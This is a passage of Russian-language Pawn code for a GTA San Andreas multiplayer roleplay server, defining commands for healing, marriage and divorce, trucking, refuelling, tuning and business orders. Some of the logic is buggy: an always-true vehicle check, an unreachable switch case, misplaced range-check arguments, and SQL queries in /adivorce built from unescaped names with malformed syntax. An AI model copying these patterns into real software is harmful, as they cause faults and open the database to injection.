	SendMes(params[0], COLOR_BLUE, "%s передал вам %i долларов", PlayerInfo[playerid][pSendername], params[1]);
	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	PlayerPlaySound(params[0], 1052, 0.0, 0.0, 0.0);
	format(totalstring,90, "%s достал(а) деньги из кармана и передал(а) их %s",PlayerInfo[playerid][pSendername], sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	return true;
}

CMD:duty(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_HOSPITAL)
	{
		if(PlayerHealP[playerid] == 0)
		{
			ShowPlayerDialog(playerid, D_HEAL, 1, "Тариф", "Введите тариф:", "Принять", "Отмена");
		}
		else
		{
			PlayerHealP[playerid] = 0;
			SendMes(playerid, COLOR_TOMATO, "Вы закончили дежурство");
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:healc(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] != F_HOSPITAL) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	if(PlayerHealP[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны заступить на дежурство!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	new vehid = GetPlayerVehicleID(playerid), Float:shealth;
	if(GetVehicleModel(vehid) != 416 || GetVehicleModel(vehid) != 563)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /healc [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете вылечить себя!");
		if(!IsPlayerInVehicle(params[0], GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
		GetPlayerHealth(params[0], shealth);
		if(shealth >= 100.0) return SendClientMessage(playerid, COLOR_GREY,"Данный игрок здоров!");
		SendMes(playerid, 0x6495EDFF, "Вы предложили вылечить %s за %i долларов", sendername(params[0]), PlayerHealP[playerid]);
		format(totalstring,90, "Желаете вылечиться за %i долларов?",PlayerHealP[playerid]);
		ShowPlayerDialog(params[0],D_HEAL+1,DIALOG_STYLE_MSGBOX,"Лечение", totalstring, "Да", "Нет");
		SetPVarInt(params[0], "PlayerHeal", playerid);
		SetPVarInt(params[0], "MoneyHeal", PlayerHealP[playerid]);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в специализированном транспорте!");
	return true;
}

CMD:heal(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] != F_HOSPITAL) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	if(PlayerHealP[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны заступить на дежурство!");
	if(IsPlayerInRangeOfPoint(playerid, 40.0,1191.9788,-1349.7419,1584.9851) && PlayerInfo[playerid][pMember] == F_HOSPITAL)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /heal [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете вылечить себя!");
		if(!IsPlayerInRangeOfPlayer(4.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
		new Float:shealth;
		GetPlayerHealth(params[0], shealth);
		if(shealth >= 100.0) return SendClientMessage(playerid, COLOR_GREY,"Данный игрок здоров!");
		new string[90];
		SendMes(playerid, 0x6495EDFF, "Вы предложили вылечить %s за %i долларов", sendername(params[0]), PlayerHealP[playerid]);
		format(string,90, "Желаете вылечиться за %i долларов?",PlayerHealP[playerid]);
		ShowPlayerDialog(params[0],778,DIALOG_STYLE_MSGBOX,"Лечение", string, "Да", "Нет");
		SetPVarInt(params[0], "PlayerHeal", playerid);
		SetPVarInt(params[0], "MoneyHeal", PlayerHealP[playerid]);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в больнице!");
	return true;
}

CMD:healme(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsPlayerInRangeOfPoint(playerid, 5.0,349.4550,164.3218,1019.9912) && PlayerInfo[playerid][pMember] == F_HOSPITAL)
	{
		if(GetPVarInt(playerid, "TimeHeal") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Восстанавливать здоровье можно раз в 30 минут!");
		SetHealth(playerid, 100);
		SendMes(playerid, COLOR_ALLDEPT, "Вы были вылечены до 100 процентов");
		SetPVarInt(playerid, "TimeHeal", gettime() + 1800);
	}
	if(PlayerLogged[playerid] == 1)
	{
		new full = 0;
		for(new i = 1; i < TOTALHOUSE; i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 60.0, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
			{
				if(HouseInfo[i][hVirtual] == GetPlayerVirtualWorld(playerid))
				{
					if(HouseInfo[i][hHeal] == 0) return SendClientMessage(playerid, COLOR_GREY, "В доме нет аптечек!");
					new Float:shealth;
					GetPlayerHealth(playerid, shealth);
					if(shealth >= 100) return SendClientMessage(playerid, COLOR_GREY, "Вы не нуждаетесь в лечении!");
					HouseInfo[i][hHeal]--;
					SetHouseInt(i, "hHeal", HouseInfo[i][hHeal]);
					SetHealth(playerid, shealth+25);
					GetPlayerHealth(playerid, shealth);
					if(shealth > 100) SetHealth(playerid, 100);
					SendMes(playerid, COLOR_BLUE, "Вы использовали 1 аптечку. Осталось %i аптечек", HouseInfo[i][hHeal]);
					format(totalstring, 90, "%s использовал аптечку", PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
					full++;
				}
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в доме!");
	}
	return true;
}

CMD:afk(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	new list,full,str[255],sttr[2000],CB[16];
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(GetPVarInt(i, "AFK_Time") > 1) list++;
	}
	format(str,sizeof(str),"{FF6347}Всего в AFK - %i игрок(ов)\n\n",list);
	strcat(sttr, str);
	foreach(new i:Player)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(GetPVarInt(i, "AFK_Time") > 1)
		{
			Convert(GetPVarInt(i,"AFK_Time"),CB);
			format(str,sizeof(str),"{ffffff}%s (ID: %d) - {FF6347}AFK: %s\n",PlayerInfo[i][pSendername], i, CB);
			strcat(sttr, str);
			full++;
		}
	}
	if(full == 0) strcat(sttr, "Информация не найдена");
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"AFK",sttr,"Закрыть","");
	return true;
}

CMD:wanted(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid))
	{
		new full, str[255],sttr[2000];
		foreach(new i:Player)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
			if(PlayerInfo[i][pWanted] > 0)
			{
				format(str,sizeof(str),"{ffff00}%s - {ffffff}Звезд: {ffff00}%i, {ffffff}обвинение: {ffff00}%s, {ffffff}доложил: {ffff00}%s\n",PlayerInfo[i][pSendername], PlayerInfo[i][pWanted], PlayerInfo[i][pWantedReason], PlayerInfo[i][pWantedWho]);
				strcat(sttr, str);
				full++;
			}
		}
		if(full == 0) strcat(sttr, "Информация не найдена");
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"Розыскиваются",sttr,"Закрыть","");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:quitjob(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Команда доступна только простым гражданам!");
	if(PlayerInfo[playerid][pJob] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы нигде не работаете!");
	SendClientMessage(playerid, COLOR_LIGHTRED, "Вы уволились с работы. Теперь вы безработный!");
	PlayerInfo[playerid][pJob] = 0;
	return true;
}

CMD:propose(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMarried] == true) return SendClientMessage(playerid, COLOR_GREY, "Вы уже связаны узами брака!");
	if(!IsPlayerInRangeOfPoint(playerid, 5.0,-2023.3407,1096.9977,18.0524)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться у церкви!");
	if(PlayerInfo[playerid][pCash] < 100000) return SendClientMessage(playerid, COLOR_GREY, "Для свадьбы необходимо 100000 долларов!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /propose [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь заключить брак сам с собой!");
	if(!IsPlayerInRangeOfPlayer(5.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	if(PlayerInfo[params[0]][pMarried] == true) return SendClientMessage(playerid, COLOR_GREY, "Игрок уже связан узами брака!");
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили руку и сердце: %s", sendername(params[0]));
	SendMes(params[0], COLOR_LIGHTBLUE, "%s предложил вам руку и сердце", PlayerInfo[playerid][pSendername]);
	format(totalstring, 90, "%s предложил вам руку и сердце\n\nВы согласны?", PlayerInfo[playerid][pSendername]);
	ShowPlayerDialog(params[0], D_HEAL+19, 0, "Свадьба", totalstring, "Да", "Нет");
	SetPVarInt(params[0], "PlayerMarriage", playerid);
	return true;
}

CMD:divorce(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMarried] == false) return SendClientMessage(playerid, COLOR_GREY, "Вы не связаны узами брака!");
	if(!IsPlayerInRangeOfPoint(playerid, 5.0,-2023.3407,1096.9977,18.0524)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться у церкви!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /divorce [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(playerid == params[0]) return SendClientMessage(playerid, COLOR_GREY, "Ты не можешь разорвать брак сам с собой!");
	if(!IsPlayerInRangeOfPlayer(5.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	if(!strcmp(sendername(params[0]),PlayerInfo[playerid][pWhoMarried],true))
	{
		SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили развод: %s", sendername(params[0]));
		SendMes(params[0], COLOR_LIGHTBLUE, "%s предложил вам развод", PlayerInfo[playerid][pSendername]);
		format(totalstring, 90, "%s предложил вам развод\n\nВы согласны?", PlayerInfo[playerid][pSendername]);
		ShowPlayerDialog(params[0], D_HEAL+20, 0, "Развод", totalstring, "Да", "Нет");
		SetPVarInt(params[0], "PlayerMarriage", playerid);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Игрок не связам узами брака с вами!");
	return true;
}

CMD:adivorce(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /adivorce [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pMarried] == false) return SendClientMessage(playerid, COLOR_GREY, "Игрок не связан узами брака!");
	new playerd;
	sscanf(PlayerInfo[params[0]][pWhoMarried], "u", playerd);
	if(IsPlayerConnected(playerd))
	{
		SendMes(playerd, COLOR_LIGHTRED, "Администратор %s развел тебя с %s", PlayerInfo[playerid][pSendername], PlayerInfo[playerd][pWhoMarried]);
		strmid(PlayerInfo[playerd][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
		PlayerInfo[playerd][pMarried] = false;
	}
	else
	{
		format(query,sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'",PlayerInfo[params[0]][pWhoMarried]);
		mysql_query(query);
		mysql_store_result();
		if(mysql_fetch_row(query))
		{
			format(query,sizeof(query), "UPDATE "TABLE_ACCOUNT"  SET married = 0, whomarried = None WHERE name = '%s'",PlayerInfo[params[0]][pWhoMarried]);
			mysql_query(query);
		}
		mysql_free_result();
	}
	SendMes(playerid, COLOR_ORANGE, "Вы развели игрока %s & %s", sendername(params[0]), PlayerInfo[params[0]][pWhoMarried]);
	SendMes(params[0], COLOR_LIGHTRED, "Администратор %s развел тебя с %s", PlayerInfo[playerid][pSendername], PlayerInfo[playerd][pWhoMarried]);
	strmid(PlayerInfo[params[0]][pWhoMarried], "None", 0, strlen("None"), MAX_PLAYER_NAME);
	PlayerInfo[params[0]][pMarried] = false;
	return true;
}
stock ResetTruck(playerid)
{
	DeletePVar(playerid,"TruckType");
	DeletePVar(playerid,"TruckGruz");
	if(GetPVarInt(playerid,"TRUCKVEH") != 0)
	{
		DestroyVehicle(GetPVarInt(playerid,"TRUCKVEH"));
		DeletePVar(playerid,"TRUCKVEH");
	}
}
CMD:loadtruck(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] != J_TRUCKER) return SendClientMessage(playerid, COLOR_GREY, "Вы не развозчик продуктов!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем дальнобоя!");
	if(PlayerToPoint(15.0, playerid, -1870.0830,-1718.5116,21.7500)) // Уголь
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /loadtruck [кол во кг]");
		if(GetPVarInt(playerid,"TRUCKVEH") != 0) return SendClientMessage(playerid, COLOR_WHITE, "Вы уже заказали!");
		if(PlayerInfo[playerid][pTruckSkill] >= 10000)
		{
			if(params[0] < 1000 || params[0] > 20000) return SendClientMessage(playerid, COLOR_GREY, "От 1000 до 20000");
		}
		else
		{
			if(params[0] < 1000 || params[0] > 5000) return SendClientMessage(playerid, COLOR_GREY, "От 1000 до 5000");
		}
		if(GetMoney(playerid) < params[0]*3) return SendClientMessage(playerid, COLOR_WHITE, "У вас нету столько денег!");
		SendMes(playerid, -1, "Вы загрузили %d кг. угля за %d$!",params[0],params[0]*3);
		SetPVarInt(playerid,"TruckType",1); // цена за 1 кг груза
		SetPVarInt(playerid,"TruckGruz",params[0]); // Сколько груза
		GiveMoney(playerid,-params[0]*3);
		SendClientMessage(playerid, -1, "Прицепите груз к вашему авто!");
		SendClientMessage(playerid, -1, "Отправляйтесь к порту San Fierro и введите /unloadtruck!");
		new carid = CreateVehicle(591, -1857.8171,-1722.3824,21.7500,118.4692, 0, 0, 90000);
		SetPVarInt(playerid,"TRUCKVEH",carid);
	}
	else if(PlayerToPoint(15.0, playerid, 2368.6980,2754.2109,10.8203)) // Металл запчасти
	{
		if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /loadtruck [кол во штук]");
		if(GetPVarInt(playerid,"TRUCKVEH") != 0) return SendClientMessage(playerid, COLOR_WHITE, "Вы уже заказали!");
		if(PlayerInfo[playerid][pTruckSkill] >= 10000)
		{
			if(params[0] < 1000 || params[0] > 20000) return SendClientMessage(playerid, COLOR_GREY, "От 1000 до 20000");
		}
		else
		{
			if(params[0] < 1000 || params[0] > 5000) return SendClientMessage(playerid, COLOR_GREY, "От 1000 до 5000");
		}
		if(GetMoney(playerid) < params[0]*7) return SendClientMessage(playerid, COLOR_WHITE, "У вас нету столько денег!");
		SendMes(playerid, -1, "Вы загрузили %d шт. запчастей за %d$!",params[0],params[0]*7);
		SetPVarInt(playerid,"TruckType",2); // цена за 1 кг груза
		SetPVarInt(playerid,"TruckGruz",params[0]); // Сколько груза
		GiveMoney(playerid,-params[0]*7);
		SendClientMessage(playerid, -1, "Прицепите груз к вашему авто!");
		SendClientMessage(playerid, -1, "Отправляйтесь к порту San Fierro и введите /unloadtruck!");
		new carid = CreateVehicle(591, 2400.5042,2753.8813,10.8203,183.6365, 0, 0, 90000);
		SetPVarInt(playerid,"TRUCKVEH",carid);
	}
	return true;
}
CMD:tgps(playerid, params[])
{
    if(PlayerLogged[playerid] == 0) return 1;
    if(MechCallTime[playerid] > 0 || TaxiCallTime[playerid] > 0 || MedicCallTime[playerid] > 0 || GetPVarInt(playerid, "ProductID") > 0) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
   	DisablePlayerRaceCheckpoint(playerid);
   	DeletePVar(playerid,"pGPSWork");
	ShowPlayerDialog(playerid, 10008, DIALOG_STYLE_LIST, " Карты GPS > Дальнобойщики", "[1] База грузовиков\n[2] Склад угля\t\t(закупка: $3 за кг)\n[2] Склад запчастей\t(закупка: $7 за шт)", "Выбрать", "Отмена");
	return 1;
}
CMD:unloadtruck(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] != J_TRUCKER) return SendClientMessage(playerid, COLOR_GREY, "Вы не развозчик продуктов!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем дальнобоя!");
	if(PlayerToPoint(15.0, playerid, -1736.6056,27.9914,3.5547))
	{
		if(GetPVarInt(playerid,"TRUCKVEH") != 0)
		{
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)) != 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "Вы потеряли свой груз!");
				ResetTruck(playerid);
				return true;
			}
			switch(GetPVarInt(playerid,"TruckType"))
			{
			case 1:
				{
					SendMes(playerid, -1, "Вы разгрузили %d кг угля и получили %d$!",GetPVarInt(playerid,"TruckGruz"),GetPVarInt(playerid,"TruckGruz")*4);
					GiveMoney(playerid,GetPVarInt(playerid,"TruckGruz")*4);
					ResetTruck(playerid);
					PlayerInfo[playerid][pTruckSkill] += GetPVarInt(playerid,"TruckGruz") / 20;
				}
			case 2:
				{
					SendMes(playerid, -1, "Вы разгрузили %d шт запчастей и получили %d$!",GetPVarInt(playerid,"TruckGruz"),GetPVarInt(playerid,"TruckGruz")*9);
					GiveMoney(playerid,GetPVarInt(playerid,"TruckGruz")*9);
					ResetTruck(playerid);
					PlayerInfo[playerid][pTruckSkill] += GetPVarInt(playerid,"TruckGruz") / 15;
				}
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться около порта San Fierro");
	}
	return true;
}


CMD:flist(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] != J_FUEL) return SendClientMessage(playerid, COLOR_GREY, "Вы не развозчик топлива!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорта!");
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 403) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится в фуре!");
	if(!IsPlayerInRangeOfPoint(playerid, 5.0,248.7008,1445.8474,11.1919)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться на заводе!");
	if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Вы должны прицепить трейлер!");
	if(GetPVarInt(playerid, "FuelID") > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже выполняете заказ!");
	FuelList(playerid);
	return true;
}

CMD:plist(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pJob] != J_PRODUCT) return SendClientMessage(playerid, COLOR_GREY, "Вы не развозчик продуктов!");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться за рулем транспорта!");
	if(!IsPlayerInRangeOfPoint(playerid, 5.0,2791.9639,-2456.1118,13.6326)) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться у склада!");
	if(GetPlayerVehicleID(playerid) >= jobproduct[0] && GetPlayerVehicleID(playerid) <= jobproduct[1])
	{
		if(LoadProductKG[GetPlayerVehicleID(playerid)] > 0) return SendClientMessage(playerid, COLOR_GREY, "Машина загружена рудой, отвезите руду на зону 51!");
		if(GetPVarInt(playerid, "ProductID") > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже выполняете заказ!");
		ProductList(playerid);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в транспорте для развозки продуктов!");
	return true;
}

CMD:fill(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится за рулем!");
	if(Fuel[GetPlayerVehicleID(playerid)] >= 200) return SendClientMessage(playerid, COLOR_GREY, "Ваш бак полон!");
	if(GetPVarInt(playerid, "Refueling") > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже заправляетесь!");
	new full;
	for(new i = 1; i <= TOTALBIZZ; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 5.0, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz])
				&& BizzInfo[i][bType] == 2)
		{
			ShowPlayerDialog(playerid, D_JOB+128, 1,"Топливо", "Введите кол-во литров топлива:", "Принять", "Отмена");
			full++;
			SetPVarInt(playerid, "FuelBizzID", i);
		}
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится у заправки!");
	return true;
}
CMD:tuning(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid, "PlayerCar")) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в вашем личном транспорте!");
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 462) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете тюнинговать мопед!");
	new full;
	for(new i = 1; i <= TOTALBIZZ; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 10.0, BizzInfo[i][bEntrx], BizzInfo[i][bEntry], BizzInfo[i][bEntrz]) && BizzInfo[i][bType] == 7)
		{
			if(BizzInfo[i][bProduct] == 0) return SendMes(playerid,COLOR_WHITE,"Тюнинг закрыт!");
			ShowPlayerDialog(playerid, D_CTO, DIALOG_STYLE_MSGBOX, BizzInfo[i][bName], "Здравствуйте\nТут вы можете прокачать свое авто\nВы хотите перейти к тюнингу вашего авто?", "Да", "Отмена");
			full++;
			SetPVarInt(playerid, "CTObizzid", i);
		}
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится у СТО!");
	return true;
}
CMD:move(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid, "PlayerCar")) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в вашем личном транспорте!");
	new Float:x, Float:y, Float:z;
	GetPlayerCameraPos(playerid, x, y, z);
	switch(random(3))
	{
	case 1:
		{
			InterpolateCameraPos(playerid, x, y, z, 609.8148,-124.6588,997.9922, 10000, 1);
		}
	case 2:
		{
			InterpolateCameraPos(playerid, x, y, z, 611.9149,-129.3359,997.9922, 10000, 1);
		}
	case 3:
		{
			InterpolateCameraPos(playerid, x, y, z, 620.5648,-125.7237,998.8359, 10000, 1);
		}
	}
	return true;
}

CMD:fuel(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
	new full, idx = GetPVarInt(playerid, "PlayerBizz");
	if(BizzInfo[idx][bType] != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы не имеете заправку, вам нужны продукты!");
	if(IsPlayerInRangeOfPoint(playerid, 2133.8867,2368.4480,10.8203,269.5711))
	{
		FuelEnter(playerid);
		full++;
	}
	else
	{
		for(new i = 1; i <= TOTALATM; i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.0, ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ]))
			{
				FuelEnter(playerid);
				full++;
			}
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться рядом с банкоматом! ( скоро можно будет в банке )");
	return true;
}

CMD:bank(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsAMafia(playerid) || IsAGang(playerid) || PlayerInfo[playerid][pMember] == F_UNITEDNEWS || PlayerInfo[playerid][pMember] == F_CASINO)
	{
		new full;
		for(new i = 1; i <= TOTALATM; i++)
		if(IsPlayerInRangeOfPoint(playerid, 3.0, ATMInfo[i][aX],ATMInfo[i][aY],ATMInfo[i][aZ]))
		if(PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pMember] > 0 && strcmp(PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fAssistant],true) == 0)
		{
			BankFracEnter(playerid);
			SendClientMessage(playerid,-1,"Все ваши действия записаны в лог.");
			full++;
		}
		else SendClientMessage(playerid, COLOR_GREY, YouCanNotBank);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:order(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerBizz(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете бизнесом!");
	new idx = GetPVarInt(playerid, "PlayerBizz");
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /order [продуктов 1000-5000]");
	new till = params[0];
	new stopbuy =0;
	SendMes(playerid,COLOR_WHITE,"till: %d ",till);
	if(IsPlayerInRangeOfPoint(playerid, 35.0,2791.8687,-2456.1548,13.6327))
	{
		for(new i = 1; i <= TOTALPRODUCT; i++)
		{
			if(ProductInfo[TOTALPRODUCT][pBizzid]  == idx) return stopbuy=1;
		}
		if(stopbuy == 0)
		{
			if(BizzInfo[idx][bType] == 1)
			{
				if(till < 1000 || till > 5000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Закажите более меньшую сумму, лимит бизнеса 5000п.");
				if(BizzInfo[idx][bMoney] < till*26) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
				TOTALPRODUCT++;
				strmid(ProductInfo[TOTALPRODUCT][pName],PlayerInfo[playerid][pSendername],0,strlen(PlayerInfo[playerid][pSendername]),MAX_PLAYER_NAME);
				ProductInfo[TOTALPRODUCT][pPrice] = till*26;
				ProductInfo[TOTALPRODUCT][pTill] = till;
				ProductInfo[TOTALPRODUCT][pBizzid] = idx;
				ProductInfo[TOTALPRODUCT][pStatus] = false;
				BizzInfo[idx][bMoney] -= ProductInfo[TOTALPRODUCT][pPrice];
				SendMes(playerid, TEAM_BLUE_COLOR, "Вы заказали %i товаров для 24/7, Снято со счета бизнеса: %i долларов.", till, ProductInfo[TOTALPRODUCT][pPrice]);
				for(new p = 0; p < MAX_PLAYERS; p++)
				{
					if(!IsPlayerConnected(p) || PlayerLogged[p] == 0 || PlayerInfo[p][pJob] != J_PRODUCT) continue;
					SendMes(p,  COLOR_ALLDEPT, "Поступил новый заказ 24/7 от %s. Используйте: /plist у склада", PlayerInfo[playerid][pSendername]);
				}
			}
			if(BizzInfo[idx][bType] == 3)
			{
				if(till < 1000 || till > 3000-BizzInfo[idx][bProduct]) return SendClientMessage(playerid, COLOR_GREY, "Закажите более меньшую сумму, лимит бизнеса 3000п.");
				if(BizzInfo[idx][bMoney] < till*23) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveEnoughMoneyBank);
				TOTALPRODUCT++;
